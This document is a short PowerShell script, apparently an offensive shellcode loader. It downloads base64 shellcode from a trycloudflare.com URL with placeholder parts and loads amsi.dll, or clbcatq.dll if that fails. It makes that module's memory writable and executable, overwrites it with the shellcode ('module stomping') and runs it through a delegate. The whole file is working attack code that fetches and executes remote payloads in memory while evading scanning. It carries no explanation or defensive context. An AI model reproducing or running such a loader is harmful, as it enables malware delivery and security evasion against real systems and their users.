$u="https://CHANGE-MECHANGE-ME.trycloudflare.com/payloads/shellcode.txt?key=PLACEHOLDER_TOKEN"
[Net.ServicePointManager]::SecurityProtocol="Tls12"

$c=@"
using System;using System.Runtime.InteropServices;
public class M{
[DllImport("ntdll.dll")]public static extern uint NtProtectVirtualMemory(IntPtr h,ref IntPtr b,ref IntPtr s,uint np,ref uint op);
[DllImport("kernel32.dll")]public static extern IntPtr LoadLibraryA(string n);
[DllImport("kernel32.dll")]public static extern IntPtr GetCurrentProcess();
}
"@
Add-Type $c

$sc=[Convert]::FromBase64String((New-Object Net.WebClient).DownloadString($u))

# Load sacrificial DLL - pick one that's not critical
$dll=[M]::LoadLibraryA("amsi.dll")
if($dll -eq [IntPtr]::Zero){$dll=[M]::LoadLibraryA("clbcatq.dll")}
if($dll -eq [IntPtr]::Zero){return}

# Make it writable
$pa=$dll;$ps=[IntPtr]$sc.Length;$op=[uint32]0
[M]::NtProtectVirtualMemory([M]::GetCurrentProcess(),[ref]$pa,[ref]$ps,0x40,[ref]$op)|Out-Null

# Overwrite the DLL with shellcode (stomp it)
[System.Runtime.InteropServices.Marshal]::Copy($sc,0,$dll,$sc.Length)

# Execute from stomped location
$d=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($dll,[Func[IntPtr]])
$d.Invoke()|Out-Null
"OK"
